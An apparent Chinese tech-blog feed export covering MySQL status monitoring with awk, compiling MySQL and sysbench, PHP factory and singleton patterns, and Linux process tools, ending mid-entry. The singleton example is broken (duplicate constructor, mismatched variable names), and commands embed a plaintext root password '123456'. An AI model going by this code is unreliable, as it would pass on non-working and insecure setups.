        <content type="html"><![CDATA[<p>主要任务是『通过脚本，刷新观察status，是否有周期性故障或波动』</p><a id="more"></a><p>根据mysql大的优化思路，当系统遇到问题时候，我们先要诊断，而不是眉毛胡子一把抓，直接所谓的因为你只是回答一些大而化之的调优原则,<br>比如:”建立合理索引”(什么样的索引合理?) “分表分库”(用什么策略分表分库?)“主从分离”(用什么中间件?)并没有从细化到定量的层面去分析.</p><h1 id="编写脚本查看mysql状态"><a href="#编写脚本查看mysql状态" class="headerlink" title="编写脚本查看mysql状态"></a>编写脚本查看mysql状态</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; show status <span class="comment">#查看mysql状态</span></span><br></pre></td></tr></table></figure><p>返回200多行，我们注重看下面几个：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Queries             <span class="comment">#当前已经发生了多少次查询</span></span><br><span class="line">Threads_connected   <span class="comment">#有几个线程过来连接了</span></span><br><span class="line">Threads_running     <span class="comment">#有几个线程正在工作</span></span><br></pre></td></tr></table></figure><p>使用bash shell和awk脚本来编写一个每秒去获取mysql服务器的状态<br>脚本如下：</p><p>countstatus</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">mysqladmin -uroot -p123456 ext|awk <span class="string">'/Queries/&#123;q=$4&#125;/Threads_connected/&#123;c=$4&#125;/Threads_running/&#123;r=$4&#125;END&#123;printf("%d %d %d\n",q,c,r)&#125;'</span> &gt;&gt; mysqlstatus.txt</span><br><span class="line">sleep 1</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>结果如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">338921 2 1</span><br><span class="line">338921 2 1</span><br><span class="line">338921 2 1</span><br><span class="line">338921 2 1</span><br><span class="line">388921 2 1</span><br><span class="line">478921 2 1</span><br><span class="line">468921 2 1</span><br><span class="line">459211 2 1</span><br><span class="line">463231 5 2</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>注意：当前行 减 上一行，才是每秒钟的请求数。<br>同样利用awk来处理一下mysqlstatus.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">'&#123;q=$1-last;last=$1&#125;&#123;printf("%d %d %d\n",q,$2,$3)&#125;'</span> mysqlstuts.txt</span><br></pre></td></tr></table></figure><h1 id="利用exel转换成折线图"><a href="#利用exel转换成折线图" class="headerlink" title="利用exel转换成折线图"></a>利用exel转换成折线图</h1><p><img src="01.png" alt=""><br><img src="02.png" alt=""><br><img src="03.png" alt=""></p><p>(从上图可以看出，大约30秒一个周期)</p><p>是否和你的缓存失效时间周期一致，那么就首先可以选择调整缓存生效策略，使失效时间分散或夜间失效。</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>编译安装mysql以及安装sysbench</title>
      <link href="/2018/09/23/%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85mysql/"/>
      <url>/2018/09/23/%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85mysql/</url>
      
        <content type="html"><![CDATA[<p>linux下编译安装，为mysql优化打下坚实的基础<br><a id="more"></a></p><p>环境为cetos7下</p><h1 id="mysql编译安装"><a href="#mysql编译安装" class="headerlink" title="mysql编译安装"></a>mysql编译安装</h1><ul><li>1.安装需要的相关库文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y gcc gcc-c++ gcc-g77 autoconf automake zlib* fiex* libxml* ncurses-devel libmcrypt* libtool-ltdl-devel*    安装需要的相关库文件</span><br></pre></td></tr></table></figure><ul><li><p>2、建立mysql安装目录及数据存放目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir  /usr/<span class="built_in">local</span>/mysql</span><br><span class="line">mkdir  -p /data/mysql</span><br></pre></td></tr></table></figure></li><li><p>3、创建用户和用户组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">groupadd mysql</span><br><span class="line">useradd -g mysql mysql</span><br></pre></td></tr></table></figure></li><li><p>4、赋予数据存放目录权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown mysql.mysql –R /data/mysql</span><br></pre></td></tr></table></figure></li><li><p>5、下载mysql</p></li></ul><p>下载mysql源码包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://dev.mysql.com/get/Downloads/MySQL-5.6/mysql-5.6.23.tar.gz</span><br></pre></td></tr></table></figure><p>解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf mysql-5.6.23.tar.gz</span><br><span class="line"><span class="built_in">cd</span> mysql-5.6.23</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> cmake -DCMAKE_INSTALL_PREFIX=/usr/<span class="built_in">local</span>/mysql \</span><br><span class="line">-DMYSQL_UNIX_ADDR=/tmp/mysqld.sock \</span><br><span class="line">-DDEFAULT_CHARSET=utf8 \</span><br><span class="line">-DDEFAULT_COLLATION=utf8_general_ci \</span><br><span class="line">-DWITH_EXTRA_CHARSETS:STRING=utf8,gbk \</span><br><span class="line">-DWITH_MYISAM_STORAGE_ENGINE=1 \</span><br><span class="line">-DWITH_INNOBASE_STORAGE_ENGINE=1 \</span><br><span class="line">-DWITH_MEMORY_STORAGE_ENGINE=1 \</span><br><span class="line">-DWITH_READLINE=1 \</span><br><span class="line">-DENABLED_LOCAL_INFILE=1 \</span><br><span class="line">-DMYSQL_DATADIR=/data/mysql \</span><br><span class="line">-DMYSQL_USER=mysql \</span><br><span class="line">-DMYSQL_TCP_PORT=3306</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> make &amp;&amp; make install</span><br></pre></td></tr></table></figure><ul><li>6、制配置文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cp support-files/my-default.cnf /etc/my.cnf</span><br></pre></td></tr></table></figure><ul><li>7、初始化数据库<br>执行前需赋给scripts/mysql_install_db文件执行权限<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 755 scripts/mysql_install_db</span><br><span class="line">scripts/mysql_install_db --user=mysql --basedir=/usr/<span class="built_in">local</span>/mysql/ \</span><br><span class="line">--datadir=/data/mysql/</span><br></pre></td></tr></table></figure></li></ul><p>注：basedir：mysql安装路径   datadir：数据库文件储存路径</p><ul><li><p>8、设置mysqld的开机启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp support-files/mysql.server /etc/init.d/mysql</span><br><span class="line">chmod 755 /etc/init.d/mysql</span><br><span class="line">chkconfig mysql on</span><br></pre></td></tr></table></figure></li><li><p>9、为MySQL配置环境变量<br>将mysql的bin目录加到PATH中，有利于以后管理和维护，在/etc/profile中加入myslq/bin，同时增加两个别名方便操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/usr/<span class="built_in">local</span>/mysql/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">alias</span> mysql_start=<span class="string">"mysqld_safe &amp;"</span></span><br><span class="line"><span class="built_in">alias</span> mysql_stop=<span class="string">"mysqladmin –u root -p shutdown"</span></span><br></pre></td></tr></table></figure></li><li><p>10、启动mysql服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/mysql start</span><br></pre></td></tr></table></figure></li></ul><p>启动完成之后用ps -ef |grep mysql 命令查看是否启动</p><ul><li><p>11、登陆mysql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure></li><li><p>12、设置密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    　　/usr/<span class="built_in">local</span>/mysql/bin/mysqladmin -u root  password  <span class="string">'123456'</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="Sysbench编译安装"><a href="#Sysbench编译安装" class="headerlink" title="Sysbench编译安装"></a>Sysbench编译安装</h1><ul><li>下载:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/akopytov/sysbench/archive/1.0.15.tar.gz</span><br></pre></td></tr></table></figure></li></ul><p>解压:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="built_in">cd</span> /path/to/sysbench</span><br><span class="line"> ./autogen</span><br><span class="line"> </span><br><span class="line">./configure --prefix=/usr/<span class="built_in">local</span>/sysbench --with-mysql-includes=/usr/<span class="built_in">local</span>/mysql/include --with-mysql-libs=/usr/<span class="built_in">local</span>/mysql/lib/</span><br><span class="line"> </span><br><span class="line"> make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p><h2 id="测试CPU性能"><a href="#测试CPU性能" class="headerlink" title="测试CPU性能"></a>测试CPU性能</h2><p>4线程查找20000以内的素数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/<span class="built_in">local</span>/sysbench/bin/sysbench --<span class="built_in">test</span>=cpu --cpu-max-prime=20000 --num-threads=4 run</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>计算机基础</title>
      <link href="/2018/09/22/408%E5%9F%BA%E7%A1%80/"/>
      <url>/2018/09/22/408%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>计算机基础脑图笔记<br><a id="more"></a></p><h1 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a>计算机基础</h1><ul><li><a href="https://zhimap.com/mmap/39937858f8694207b3e0e3d5cde73ba8" target="_blank" rel="noopener">数据结构与算法</a></li><li><a href="https://zhimap.com/mmap/cb6e85d68ea2487ab39ac19ede0541ab" target="_blank" rel="noopener">计算机操作系统</a></li><li><a href="https://zhimap.com/mmap/4cdc68b0c6294b67a52392180a961c85" target="_blank" rel="noopener">计算机网络</a></li><li><a href="https://zhimap.com/mmap/255adea088934225a5e48f2b39564b1d" target="_blank" rel="noopener">计算机组成原理</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 408 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>resume</title>
      <link href="/2018/09/17/resume/"/>
      <url>/2018/09/17/resume/</url>
      
        <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to visit my resume, enter password to read." />    <label for="pass">Welcome to visit my resume, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>php核心学习-设计模式的学习-简单工厂模式以及改进的工厂模式</title>
      <link href="/2018/09/14/php%E6%A0%B8%E5%BF%83%E5%AD%A6%E4%B9%A0-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0-%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E4%BB%A5%E5%8F%8A%E6%94%B9%E8%BF%9B%E7%9A%84%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"/>
      <url>/2018/09/14/php%E6%A0%B8%E5%BF%83%E5%AD%A6%E4%B9%A0-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0-%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E4%BB%A5%E5%8F%8A%E6%94%B9%E8%BF%9B%E7%9A%84%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>工厂模式解决特定场景的问题，了解一下<br><a id="more"></a></p><h1 id="简单工厂模式"><a href="#简单工厂模式" class="headerlink" title="简单工厂模式"></a>简单工厂模式</h1><p>可简单理解为，需要什么什么类，发请求的类名给工厂，工厂负责穿凿对象并返回</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">db</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">conn</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbmysql</span> <span class="keyword">implements</span> <span class="title">db</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">conn</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"连上了mysql"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbsqlite</span> <span class="keyword">implements</span> <span class="title">db</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">conn</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"连上了sqlite"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//工厂类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Factory</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">createDB</span><span class="params">($type)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($type==<span class="string">'mysql'</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> dbmysql();</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($type==<span class="string">'sqlite'</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> dbsqlite();</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"not exist the db"</span>,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="简单工厂的问题"><a href="#简单工厂的问题" class="headerlink" title="简单工厂的问题"></a>简单工厂的问题</h2><p>看似仅仅是把创建对象的过程包装了一下,真正的变化在于”面向接口”,”隔离封装”,客户端只知接口,不知具体实现.后端的实现,只知接口,不管前端谁调用</p><p>但是简单工厂违反了开闭原则，如果新增PDO方式,是否还要改Factory?修改if/else分支?，每次有新增的db类就要改下工厂，如果是java这类语言，那肯定不行，每次都要编译一下</p><p>开闭原则</p><blockquote><p>“软件实体应当对扩展开放，对修改关闭”。</p></blockquote><h1 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">interface db&#123;</span><br><span class="line">       <span class="keyword">function</span> conn();</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line"> interface Factory&#123;</span><br><span class="line">       <span class="keyword">function</span> createDb()</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> class dbmysql implements db&#123;</span><br><span class="line">       public <span class="keyword">function</span> conn()</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="built_in">echo</span> <span class="string">"连上了mysql"</span>;</span><br><span class="line">       &#125;</span><br><span class="line"> &#125;</span><br><span class="line">   </span><br><span class="line"> class dbsqlite implements db&#123;</span><br><span class="line">           public <span class="keyword">function</span> conn()</span><br><span class="line">           &#123;</span><br><span class="line">               <span class="built_in">echo</span> <span class="string">"连上了sqlite"</span>;</span><br><span class="line">           &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> class mysqlFactory implements Factory&#123;</span><br><span class="line">       public <span class="keyword">function</span> createDb()</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="built_in">return</span> new dbmysql();</span><br><span class="line">       &#125;</span><br><span class="line"> &#125;</span><br><span class="line">   </span><br><span class="line"> class sqliteFactory implements Factory&#123;</span><br><span class="line">         public <span class="keyword">function</span> createDb()</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="built_in">return</span> new dbsqlite();</span><br><span class="line">         &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>如上所述，有新增类的的时候，实现db以及Factory可以了。</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>php核心学习-设计模式的学习-单例模式</title>
      <link href="/2018/09/14/php%E6%A0%B8%E5%BF%83%E5%AD%A6%E4%B9%A0-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0-%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"/>
      <url>/2018/09/14/php%E6%A0%B8%E5%BF%83%E5%AD%A6%E4%B9%A0-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0-%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>单例模式了解一下<br><a id="more"></a></p><h1 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h1><p>简单理解就是一个类实例化一个对象，同一个对象</p><h2 id="如何确保只实例化一个对象"><a href="#如何确保只实例化一个对象" class="headerlink" title="如何确保只实例化一个对象"></a>如何确保只实例化一个对象</h2><ul><li>1:对象的产生,需要new或者clone</li><li>2:防止产生过多的对象,要防止new和clone</li><li>3:综上,没有对象时,允许new,并把对象缓存. 下次直接返回该对象</li></ul><h2 id="代码简单实现"><a href="#代码简单实现" class="headerlink" title="代码简单实现"></a>代码简单实现</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class single&#123;</span><br><span class="line">    protected static <span class="variable">$this</span> =null;</span><br><span class="line">    //封锁外部new操作</span><br><span class="line">    private <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;&#125;</span><br><span class="line">    //封锁外部<span class="built_in">clone</span>操作</span><br><span class="line">    private <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;&#125;</span><br><span class="line">    //开放内部new操作</span><br><span class="line">    public static <span class="keyword">function</span> getIns()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(self::<span class="variable">$ins</span>==null)&#123;</span><br><span class="line">            self::<span class="variable">$ins</span> = new self();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">return</span> self::<span class="variable">$ins</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux学习之进程管理</title>
      <link href="/2018/09/13/Linux%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
      <url>/2018/09/13/Linux%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>了解ps，top,kill命令的使用</p><a id="more"></a><h1 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h1><h2 id="进程分类"><a href="#进程分类" class="headerlink" title="进程分类"></a>进程分类</h2><p>进程一般分为交互进程、批处理进程和守护进程三类。<br>值得一提的是守护进程总是活跃的，一般是后台运行，守护进程一般是由系统在开机时通过脚本自动激活启动或超级管理用户root来启动。比如在Redhat中，我们可以定义httpd 服务器的启动脚本的运行级别，此文件位于/etc/init.d目录下，文件名是httpd，/etc/init.d/httpd 就是httpd服务器的守护程序，当把它的运行级别设置为3和5时，当系统启动时，它会跟着启动。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># chkconfig  --level 35  httpd on</span></span><br></pre></td></tr></table></figure><h2 id="进程属性"><a href="#进程属性" class="headerlink" title="进程属性"></a>进程属性</h2><p>进程ID（PID)：是唯一的数值，用来区分进程；<br>父进程和父进程的ID（PPID)；<br>启动进程的用户ID（UID）和所归属的组（GID）；<br>进程状态：状态分为运行R、休眠S、僵尸Z；<br>进程执行的优先级；<br>进程所连接的终端名；<br>进程资源占用：比如占用资源大小（内存、CPU占用量）；</p><h2 id="父进程和子进程"><a href="#父进程和子进程" class="headerlink" title="父进程和子进程"></a>父进程和子进程</h2><p>他们的关系是管理和被管理的关系，当父进程终止时，子进程也随之而终止。但子进程终止，父进程并不一定终止。比如httpd服务器运行时，我们可以杀掉其子进程，父进程并不会因为子进程的终止而终止。<br>在进程管理中，当我们发现占用资源过多，或无法控制的进程时，应该杀死它，以保护系统的稳定安全运行；</p><h1 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h1><p>对于Linux进程的管理，是通过进程管理工具实现的，比如ps、kill、pgrep等工具；</p><h2 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h2><p>ps 提供了很多的选项参数，常用的有以下几个；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">l  长格式输出；</span><br><span class="line">u  按用户名和启动时间的顺序来显示进程；</span><br><span class="line">j  用任务格式来显示进程；</span><br><span class="line">f  用树形格式来显示进程；</span><br><span class="line">a  显示所有用户的所有进程（包括其它用户）；</span><br><span class="line">x  显示无控制终端的进程；</span><br><span class="line">r  显示运行中的进程；</span><br><span class="line">ww 避免详细参数被截断；</span><br></pre></td></tr></table></figure><p>我们常用的选项是组合是aux 或lax，还有参数f的应用；</p><p>ps aux / ps lax输出的字段解释</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">USER进程的属主；</span><br><span class="line">PID进程的ID；</span><br><span class="line">PPID      父进程；</span><br><span class="line">%CPU进程占用的CPU百分比；</span><br><span class="line">%MEM占用内存的百分比；</span><br><span class="line">PRI          代表这个程序『可被执行的优先级』</span><br><span class="line">NI   进程的NICE值，数值大，表示较少占用CPU时间；</span><br><span class="line">VSZ 进程虚拟大小；</span><br><span class="line">RSS  驻留中页的数量；</span><br><span class="line">TTY  终端ID</span><br><span class="line">STAT 进程状态</span><br><span class="line">D    不间断的睡眠(usually IO)</span><br><span class="line">R    正在运行中在队列中可过行的； </span><br><span class="line">S    处于休眠状态；</span><br><span class="line">T    停止或被追踪； </span><br><span class="line">W    进入内存交换（从内核2.6开始无效）；</span><br><span class="line">X    死掉的进程（从来没见过）；</span><br><span class="line">Z    僵尸进程；</span><br><span class="line"></span><br><span class="line">&lt;    优先级高的进程 </span><br><span class="line">N    优先级较低的进程 </span><br><span class="line">L    有些页被锁进内存； </span><br><span class="line">s    进程的领导者（在它之下有子进程）；</span><br><span class="line">l    is multi-threaded (using CLONE_THREAD, like NPTL pthreads <span class="keyword">do</span>)</span><br><span class="line">+    位于后台的进程组；</span><br><span class="line"></span><br><span class="line">WCHAN正在等待的进程资源；</span><br><span class="line">START     启动进程的时间；</span><br><span class="line">TIME进程消耗CPU的时间；</span><br><span class="line">COMMAND    命令的名称和参数；</span><br></pre></td></tr></table></figure><h3 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h3><ul><li><p>实例一：ps aux 最常用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># ps -aux | more</span></span><br><span class="line">可以用 | 管道和 more 连接起来分页查看</span><br><span class="line">[root@localhost ~]<span class="comment"># ps -aux  &gt; ps001.txt</span></span><br><span class="line">[root@localhost ~]<span class="comment"># more ps001.txt </span></span><br><span 